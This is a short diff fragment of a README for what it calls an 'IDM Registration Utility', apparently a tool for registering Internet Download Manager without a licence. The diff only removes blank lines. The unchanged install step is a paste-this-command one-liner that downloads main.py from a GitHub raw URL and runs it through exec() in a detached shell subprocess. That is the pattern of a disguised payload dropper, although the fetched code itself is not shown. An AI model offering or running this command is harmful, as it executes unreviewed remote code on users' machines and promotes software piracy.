@@ -26,9 +26,6 @@ Here's a screenshot of what the Registered IDM looks like:
 ```python
 pip install requests psutil && python -c "import subprocess, os; subprocess.Popen(['python', '-c', 'import requests, psutil; exec(requests.get(\"https://raw.githubusercontent.com/musaalif6969/IDM-Registration-Utility/main/main.py\").text)'], cwd=os.getcwd(), shell=True)"
 
-
-
-
 ```
 4. You are good to go!
 
